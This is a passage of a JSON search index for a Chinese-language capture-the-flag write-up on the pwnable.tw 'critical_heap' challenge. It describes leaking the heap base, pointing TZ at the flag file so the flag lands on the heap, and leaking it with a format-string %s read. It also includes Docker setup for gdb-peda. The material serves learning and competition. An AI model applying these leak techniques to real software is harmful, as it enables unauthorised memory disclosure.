)\n0x020 value  (heap address)  \u6700\u5f8c\u5c31\u4f7f\u7528 show \u628a struct \u5370\u51fa\u4f86\u5c31\u53ef\u4ee5\u5f97\u5230 heap address \u4e86  \u56e0\u70ba\u5728 heap \u4e0a\u76f8\u5c0d\u4f4d\u7f6e\u4e0d\u8b8a\uff0c\u7528 gdb \u770b\u4e00\u4e0b\u8ddf base \u5dee\u591a\u9060\uff0cleak \u51fa\u4f86\u5f8c\u6e1b\u6389\u5c31\u662f heap base \u4e86", 
            "title": "leak heap base"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#tz", 
            "text": "\u9019\u500b\u90e8\u5206\u5c31\u5275\u4e00\u500b system \u7136\u5f8c\u7528 setenv \u628a TZ \u8a2d\u6210  /home/critical_heap++/flag  \u63a5\u8457\u5275\u4e00\u500b time struct\uff0c\u5c31\u6703\u5728 localtime \u5c07 flag \u8b80\u53d6\u5230 heap \u4e0a\u4e86\uff0c\u7136\u5f8c\u7528 gdb \u770b\u4e00\u4e0b offset \u642d\u914d heap base \u5c31\u53ef\u4ee5\u77e5\u9053 flag address \u4e86", 
            "title": "TZ"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#format-string", 
            "text": "\u5229\u7528 format string \u642d\u914d %s \u53ef\u4ee5 leak \u4efb\u610f\u4f4d\u5740\u7684\u7279\u6027\u4f86 leak flag address  \u53e6\u5916\uff0c\u56e0\u70ba\u662f\u4f7f\u7528 printf_chk \u7684\u95dc\u4fc2\uff0c\u4e0d\u80fd\u4f7f\u7528  $  \u8981\u81ea\u5df1\u7528 %c \u4f86\u8df3\u5230\u6307\u5b9a\u5340\u57df", 
            "title": "format string"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#note", 
            "text": "", 
            "title": "Note"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#peda-in-docker", 
            "text": "\u9019\u6b21\u6709\u7d66\u4e00\u500b docker \u7684\u74b0\u5883\uff0c\u8981\u5728\u88e1\u9762\u4f7f\u7528 gdb-peda \u7684\u8a71\uff0c\u8981\u6539\u52d5\u4ee5\u4e0b\u8a2d\u5b9a", 
            "title": "peda in docker"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#dockerfile", 
            "text": "RUN  apt-get install gdb git -y WORKDIR  /root  RUN  git clone https://github.com/scwuaptx/Pwngdb.git  ;  cp ~/Pwngdb/.gdbinit ~/ RUN  git clone https://github.com/scwuaptx/peda.git ~/peda  ;   echo   source ~/peda/peda.py    ~/.gdbinit  ;  cp ~/peda/.inputrc ~/", 
            "title": "Dockerfile"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#docker-composeyml", 
            "text": "critical_heap : \n     cap_add : \n         -   SYS_PTRACE", 
            "title": "docker-compose.yml"
        }
    ]
}